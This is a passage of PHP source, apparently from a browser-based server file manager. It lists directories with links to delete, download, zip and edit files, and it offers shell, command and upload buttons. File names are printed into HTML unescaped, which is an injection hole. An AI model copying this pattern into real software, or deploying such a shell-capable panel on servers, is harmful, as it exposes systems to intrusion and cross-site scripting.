        $array_file = array();
        $array_else = array();
        // clearstatcache();
        // --- case stream ? -----
        while ($file = readdir($folder)){
            // ===========================
            $file_inf = pathinfo($PE_thevar["PE_current_dir"] . "/" . $file);
            $file_ext = $file_inf["extension"];
            $filename = $file_inf["basename"];
            $j++;

            $return_type = PE_mime_type($file_ext);
            $ctype = $return_type["type"];
            $image = $return_type["image"];
            $editor = $return_type["editor"];
            // ===========================
            $file_path = realPath($file_inf["dirname"]) . "/" . $file_inf["basename"];
            if((PE_is_include_dir($file_path, $_SERVER["DOCUMENT_ROOT"])) && (is_file($PE_thevar["PE_current_stream"] . $file_path))){
                $url_path_link = substr($_SERVER["PHP_SELF"], 0, strlen($_SERVER["PHP_SELF"]) - strlen($_SERVER["SCRIPT_NAME"])) . "/" . substr($file_path, strlen($_SERVER["DOCUMENT_ROOT"]));
            }else{
                $url_path_link = $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=select&PE_send_type=" . urlencode($editor) . " \"";
            }
            $url_path_link = realpath($url_path_link);
            if(is_dir($file_path)){
                $count_dir++;
                $list_path_link[] = "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode(realpath($file_path)) . "/&PE_select_action=list\"><img title=\"Open dir($file_path)\" border=\"0\" alt=\"[]-> \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "folder.png") . "\"  /> <b>" . $filename . "</b> </a>";
                $list_path_action[] = "<a onclick=\"return PE_confirm('delete', js_message1, js_message2)\"  href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode(realpath($file_path)) . "&PE_select_action=rm_dir" . " \"><img  title=\"Remove dir($file_path)\" border=\"0\" alt=\"[x] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "bomb.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=download" . "\"><img title=\"Download file($file_path)\" border=\"0\" alt=\"[d] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "down.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=zip" . "\"><img title=\"Zip file($file_path)\" border=\"0\" alt=\"[z] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "compress.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=property\"><img title=\"Property file($file_path)\" border=\"0\" alt=\"[p] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "comp.gray.png") . "\" /></a>". "<a href=\"" . $url_path_link . "\">" . "<img title=\"Url file($url_path_link)\" border=\"0\" alt=\"[u] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "world1.png") . "\" /></a>";

                $list_path_info[] = "<b>[" . $filename . "] " . PE_translate("directory") . " </b> ";
                $list_path_size[] = ""; //@ (filesize($file_path));
                @ $list_path_type[] = " " . filetype($file_path);
                $array_dir[] = $file_path;
            } elseif(is_link($file_path)){
                $count_link++;
                if(!empty($PE_config["beautifull_name"])) $filename = str_replace("_", " ", substr($filename, 0, strrpos($filename, ".")));
                $list_path_link[] = "<a onclick=\"return PE_confirm('delete', js_message1, js_message2)\" href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=select&PE_send_type=" . urlencode($editor) . " \">" . "<img title=\"Select file($file_path)\" border=\"0\" alt=\"@-> \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . $image) . "\" />$filename</a>";

                $list_path_action[] = "<a onclick=\"return PE_confirm('delete', js_message1, js_message2)\"  href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=delete\">" . "<img title=\"Delete file($file_path)\" border=\"0\" alt=\"[x] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "bomb.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=edit\">" . "<img title=\"Edit file($file_path)\" border=\"0\" alt=\"[e] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "quill.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode(readlink($file_path)) . "&PE_select_action=download\"><img title=\"Download file($file_path)\" border=\"0\" alt=\"[d] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "down.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=property\"><img title=\"Property file($file_path)\" border=\"0\" alt=\"[p] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "comp.gray.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode(readlink($file_path)) . "&PE_select_action=zip\">" . "<img title=\"Zip file (" . $file_path . ")\" border=\"0\" alt=\"[z]\"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "compress.png") . "\" /></a>";

                $list_path_info[] = " " . PE_translate("link") . " =>" . readlink($file_path) . "  [" . $file_ext . " ] " . $ctype ;
                $list_path_size[] = @ (filesize($file_path));
                $list_path_type[] = $file_ext; //@ filetype($file_path);
                $array_link[] = $file_path;
            } elseif(is_file($PE_thevar["PE_current_stream"] . $file_path)){
                $count_file++;
                if(!empty($PE_config["beautifull_name"])) $filename = str_replace("_", " ", substr($filename, 0, strrpos($filename, ".")));
                $list_path_link[] = "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=select&PE_send_type=" . urlencode($editor) . " \"><img title=\"Select file($file_path)\" border=\"0\" alt=\"#-> \" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . $image) . "\" height=\"15\" width=\"15\" />$filename</a>";

                $list_path_action[] = "<a onclick=\"return PE_confirm('delete', js_message1, js_message2)\" href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=delete\">" . "<img title=\"Delete file($file_path)\" border=\"0\" alt=\"[x] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "bomb.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=download\">" . "<img title=\"Download file($file_path)\" border=\"0\" alt=\"[d] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "down.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=zip\">" . "<img title=\"Zip file($file_path)\" border=\"0\" alt=\"[z] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "compress.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=property\">" . "<img title=\"Property file($file_path)\" border=\"0\" alt=\"[p] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "comp.gray.png") . "\" /></a>" . "<a href=\"" . $url_path_link . "\">" . "<img title=\"Url file($url_path_link)\" border=\"0\" alt=\"[u] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "world1.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=edit\">" . "<img title=\"Edit file($file_path)\" border=\"0\" alt=\"[e] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "quill.png") . "\" /></a>";

                $list_path_info[] = " " . PE_translate("file") . "   [" . $file_ext . " ] " . $ctype ;
                $list_path_size[] = @ (filesize($file_path));
                $list_path_type[] = $file_ext; //@ filetype($file_path);
                $array_file[] = $file_path;
            }else{
                $count_else++;
                if(!empty($PE_config["beautifull_name"])) $filename = str_replace("_", " ", substr($filename, 0, strrpos($filename, ".")));
                $list_path_link[] = "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=select&PE_send_type=" . urlencode($editor) . " \"><img title=\"Select file($file_path)\" border=\"0\" alt=\"*-> \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . $image) . "\" height=\"15\" width=\"15\" />$filename</a> ";
                $list_path_action[] = "<a  onclick=\"return PE_confirm('delete', js_message1, js_message2)\" href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=" . "delete\"><img title=\"Delete file($file_path)\" border=\"0\" alt=\"[x] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "bomb.png") . "\" /></a><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=download" . "\"><img title=\"Download file($file_path)\" border=\"0\" alt=\"[d] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "down.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" .
                urlencode($file_path) . "&PE_select_action=zip" . "\"><img title=\"Zip file($file_path)\" border=\"0\" alt=\"[z] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "compress.png") . "\" /></a>" . "<a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($file_path) . "&PE_select_action=edit" . "\"><img border=\"0\" alt=\"[e] \"  height=\"15\" width=\"15\" src=\"" .
                PE_icon_src($PE_config, $PE_config["images_url"] . "quill.png") . "\" /></a>";

                $list_path_info[] = " " . PE_translate("file") . "   [" . $file_ext . " ] " . $ctype ;
                $list_path_size[] = @ filesize($file_path);
                $list_path_type[] = $file_ext; //@ filetype($file_path);
                $array_else[] = $file_path;
            }
            $list_path_name[] = $file_path;
            $list_path_date_time[] = @ filemtime($file_path);
            $list_path_group[] = @ filegroup($file_path);
            $list_path_owner[] = @ fileowner($file_path);
            $list_path_permission[] = @ fileperms($file_path);
        }
        @ closedir($folder);
        // ===========================
        // print_r($array_all_file);exit;
        switch ($PE_thevar["PE_select_order"]){
            case "name":
                array_multisort($list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;

            case "comment":
                array_multisort($list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;

            case "size":
                array_multisort($list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;
            case "type":
                array_multisort($list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;
            case "filemtime":
                array_multisort($list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;
            case "owner":
                array_multisort($list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;
            case "group":
                array_multisort($list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;
            case "permission":
                array_multisort($list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_group, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;

            case "action":
            default:
                array_multisort($list_path_type, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_name, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_link, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_action, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_info, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_size, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_date_time, $PE_thevar["PE_order_asc_desc"], SORT_NUMERIC,
                    $list_path_owner, $PE_thevar["PE_order_asc_desc"], SORT_STRING,
                    $list_path_permission, $PE_thevar["PE_order_asc_desc"], SORT_STRING
                    );
                break;
        }
        print("(" . $count_dir . " " . PE_translate("dir") . "; " . ($count_file) . " " . PE_translate("files") . "; " . $count_link . " " . PE_translate("link") . "; " . $count_else . " " . PE_translate("other") . ")<br />");
        ?>
 <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

        ?>" >
 <input type="hidden" name="PE_the_file" value="<?php print($PE_thevar["PE_current_dir"]);
        ?>" />
         <?php print(PE_integration($PE_config, "input"));

            ?>

 <input type="hidden" name="PE_select_action" value="file_select" />
<fieldset class="bubble"><legend><?php print($PE_thevar["PE_current_dir"]);?></legend>
 <table class="num0" border="0" cellspacing="1" align="center" cellpadding="1" width="100%">
 <tr align="left" class="rown2">
 <?php
        // ===========================
        if(!empty($PE_config["show_col_num"])) print("<td></td>");
        if(!empty($PE_config["show_col_check"])) print("<td>.</td>");
        if(!empty($PE_config["show_col_name"])) print("<td><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=name&PE_select_action=order\" >" . PE_translate("name") . "</a></b></td>");
        if(!empty($PE_config["show_col_action"])) print("<td><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=action&PE_select_action=order\" >" . PE_translate("action") . "</a></b></td>");
        if(!empty($PE_config["show_col_comment"])) print("<td width=\"100\"><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=comment&PE_select_action=order\" >" . PE_translate("comment") . "</a></b></td>");
        if(!empty($PE_config["show_col_size"])) print("<td><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=size&PE_select_action=order\" >" . PE_translate("size") . "</a></b></td>");
        if(!empty($PE_config["show_col_type"])) print("<td><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=type&PE_select_action=order\" >" . PE_translate("type") . "</a></b></td>");
        if(!empty($PE_config["show_col_perm"])) print("<td><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=permission&PE_select_action=order\" >" . PE_translate("permission") . "</a></b></td>");
        if(!empty($PE_config["show_col_owner"])) print("<td><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=owner&PE_select_action=order\" >" . PE_translate("owner") . "</a></b></td>");
        if(!empty($PE_config["show_col_group"])) print("<td><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=group&PE_select_action=order\" >" . PE_translate("group") . "</a></b></td>");
        if(!empty($PE_config["show_col_date_time"])) print("<td width=\"70\"><b><a href=\"" . $_SERVER["PHP_SELF"] . "?". PE_integration($PE_config) . "PE_the_file=" . urlencode($PE_thevar["PE_current_dir"]) . "&PE1_select_order=filemtime&PE_select_action=order\" >" . PE_translate("last_modified") . "</a></b></td>");
        print("</tr>");
        // ===========================
        foreach($list_path_name as $key1 => $value){
            if(PE_getpost("PE_view_mode") != "preview"){
                print("<tr class=\"row" . ($key1 % 2) . "\" align=\"left\" >");
                if(!empty($PE_config["show_col_num"])) print("<td> " . ($key1 + 1) . "</td>");
                if(!empty($PE_config["show_col_check"])) print("<td> " . "<input type=\"checkbox\" name=\"PE1_file_check[$key1]\" value=\"" . urlencode($list_path_name[$key1]) . "\" />" . "</td>");
                if(!empty($PE_config["show_col_name"])) print("<td> " . $list_path_link[$key1] . "</td>");
                if(!empty($PE_config["show_col_action"])) print("<td> " . $list_path_action[$key1] . "</td>");
                if(!empty($PE_config["show_col_comment"])) print("<td> " . $list_path_info[$key1] . "</td>");
                if(is_dir($list_path_name[$key1])){
                    if(!empty($PE_config["show_col_size"])) print("<td> " . "" . "</td>");
                }else{
                    if(!empty($PE_config["show_col_size"])) print("<td>" . PE_format_filesize($list_path_size[$key1]) . " </td>");
                }
                if(!empty($PE_config["show_col_type"])) print("<td> " . $list_path_type[$key1] . "</td>");
                if(!empty($PE_config["show_col_perm"])) print("<td> " . PE_conv_perm($list_path_permission[$key1]) . "</td>");
                if(!empty($PE_config["show_col_owner"])) print("<td> (" . PE_conv_owner($list_path_owner[$key1]) . ")</td>");
                if(!empty($PE_config["show_col_group"])) print("<td> [" . PE_conv_group($list_path_group[$key1]) . "]</td>");
                if(!empty($PE_config["show_col_date_time"])) print("<td> " . PE_format_date_time($PE_config, $list_path_date_time[$key1]) . "</td>");
                print("</tr>");
                // ===========================
            }else{
                if(!($key1 % 6)){
                    print("<tr align=\"left\" >");
                }
                print("<td  height=\"200\" width=\"150\"  class=\"num" . ($key1 % 2) . "\" colspan=\"2\"> " . ($key1 + 1) . "-");
                if(!empty($PE_config["show_col_check"])) print("  " . "<input type=\"checkbox\" name=\"PE1_file_check[$key1]\" value=\"" . urlencode($list_path_name[$key1]) . "\" />" . " ");
                if(!empty($PE_config["show_col_name"])) print("" . $list_path_link[$key1] . "<br />");
                $mime_type = PE_mime_type($list_path_type[$key1]);

                if($mime_type["editor"] == "image"){
                    if(!empty($PE_config["self_header"])){
                        print("<img  height=\"100\" width=\"100\" src=\"?". $PE_config["PE_key"]."=".$PE_config["PE_val"]."&" . "PE_imgpath=" . urlencode($list_path_name[$key1]) . "\" title=\"" . $list_path_name[$key1] . "\"  alt=\"" . $list_path_name[$key1] . "\" border=\"1\" />");
                    }else{
                        print("<img  height=\"100\" width=\"100\" src=\"" . urlencode($list_path_name[$key1]) . "\" title=\"" . $list_path_name[$key1] . "\"  alt=\"" . $list_path_name[$key1] . "\" border=\"1\" />");
                    }
                }

                if($mime_type["editor"] == "text"){
                    $f = fopen($PE_thevar["PE_current_stream"] . $list_path_name[$key1], "r");
                    $f_text = fread($f, 120);
                    print("<p class=\"num0\" >" . nl2br(wordwrap($f_text, 15)) . "</p>");
                    fclose($f);
                }

                if(!empty($PE_config["show_col_action"])) print("<br />" . $list_path_action[$key1] . " <br />");
                if(!empty($PE_config["show_col_comment"])) print("" . $list_path_info[$key1] . "<br />");
                if(is_dir($list_path_name[$key1])){
                }else{
                    if(!empty($PE_config["show_col_size"])) print("  " . PE_format_filesize($list_path_size[$key1]) . ", ");
                }
                if(!empty($PE_config["show_col_owner"])) print("  (" . PE_conv_owner($list_path_owner[$key1]) . ")  ");
                if(!empty($PE_config["show_col_group"])) print("  [" . PE_conv_group($list_path_group[$key1]) . "]<br />");
                if(!empty($PE_config["show_col_perm"])) print("  " . PE_conv_perm($list_path_permission[$key1]) . "<br />");
                if(!empty($PE_config["show_col_date_time"])) print("  " . PE_format_date_time($PE_config, $list_path_date_time[$key1]));
                print("</td>");
                if(!($key1 % 6 + 1)){
                    print("</tr>");
                }
            }
        }
        // ===========================
        ?>
 <tr>
 <td align="left" colspan="12">
<?php
        if(!empty($PE_config["show_col_check"])){
            print("<table><tr><td>" . PE_translate("all"));

            ?></td>
 <td><input type="checkbox" name="check_all" id="check_all" onchange="PE_check_uncheck(this.form, 'check_all');" value="yes" /></td>
 <td align="left" colspan="2">
 <b> <?php print(PE_translate("cmd_select"));

            ?> </b>

         <select name="PE1_action_check">
<optgroup label="   -   ">
         <option value="copy_all"><?php print(PE_translate("copy_all"));?></option>
         <option value="cut_all"><?php print(PE_translate("cut_all"));?></option>
         <option value="paste_all"><?php print(PE_translate("paste_all"));?></option>
         <option value="delete_all"><?php print(PE_translate("delete_all"));?></option>
</optgroup>
<optgroup label="   -   ">
         <option value="download_all"><?php print(PE_translate("download_all"));?></option>
         <option value="zip_all"><?php print(PE_translate("zip_all"));?></option>
         <!--option value="gzip_all">Gzip</option>
         <option value="bz2_all">Bz2</option-->
</optgroup>
<!--optgroup label="   -   ">
         <option value="only_shell"><?php print(PE_translate("shell"));?></option>
         <option value="only_replace"><?php print(PE_translate("replace"));?></option>
         <option value="cmd_shell"><?php print(PE_translate("cmd_shell"));?></option>
         <option value="cmd_upload"><?php print(PE_translate("cmd_upload"));?></option>
         <option value="cmd_1"><?php print(PE_translate("cmd_1"));?></option>
         <option value="cmd_2"><?php print(PE_translate("cmd_2"));?></option>
</optgroup-->
         </select>
 <input type="submit" value=" <?php print(PE_translate("run"));
            ?>" />
 </td>
 <td align="right"> - <td>
<?php
            print("</td><td>" . PE_form($PE_config, PE_translate("go_home"), "hidden", "PE_the_file", "." . PE_path_separator(), "hidden", "PE_select_action", "list", "", "", ""));
            print("</td><td>" . PE_form($PE_config, PE_translate("shell"), "hidden", "PE_the_file", $PE_config["PE_current_dir"], "hidden", "PE_select_action", "only_shell", "", "", ""));
            print("</td><td>" . PE_form($PE_config, PE_translate("replace"), "hidden", "PE_the_file", $PE_config["PE_current_dir"], "hidden", "PE_select_action", "only_replace", "", "", ""));
            print("</td><td>" . PE_form($PE_config, PE_translate("extend_command"), "hidden", "PE_the_file", $PE_config["PE_current_dir"], "hidden", "PE_select_action", "cmd_shell", "", "", ""));
            print("</td><td>" . PE_form($PE_config, PE_translate("upload"), "hidden", "PE_the_file", $PE_config["PE_current_dir"], "hidden", "PE_select_action", "cmd_upload", "", "", ""));
            print("</td><td>" . PE_form($PE_config, PE_translate("command1"), "hidden", "PE_the_file", $PE_config["PE_current_dir"], "hidden", "PE_select_action", "cmd_1", "", "", ""));
            print("</td><td>" . PE_form($PE_config, PE_translate("command2"), "hidden", "PE_the_file", $PE_config["PE_current_dir"], "hidden", "PE_select_action", "cmd_2", "", "", ""));
            print("</td></tr>");
            print("</table>");
        }

        ?>
  </td>
</tr>
 </table>
 </fieldset>
 </form>
 <?php
        // ===================================
        sort($array_dir);
        sort($array_file);
        sort($array_link);
        sort($array_else);
        PE_command(array_merge(array("<optgroup label=\" - " . PE_translate("Dir") . " -  \">"),
                $array_dir, array("</optgroup><optgroup label=\" - " . PE_translate("Files") . " -  \">"),
                $array_file, array("</optgroup><optgroup label=\" - " . PE_translate("Link") . " -  \">"),
                $array_link, array("</optgroup><optgroup label=\" - " . PE_translate("Other") . " -  \">"),
                $array_else), $PE_config, $PE_thevar, $PE_language);
        // ===================================
    }else{
                ?>
                <table class="num2"   width="100%">
                <tr><td align="left">
                <?php
                $array_file = split("<br />", highlight_file($PE_thevar["PE_current_stream"] . $PE_thevar["the_file"], true));
                foreach($array_file as $key => $val){
                    print("<br />/*" . ($key + 1) . "*/  " . $val);
                }

            ?>
                    </td></tr></table>


         <form method="post" action="<?php print($_SERVER["PHP_SELF"]);

            ?>" >
         <?php print(PE_integration($PE_config, "input"));

            ?>

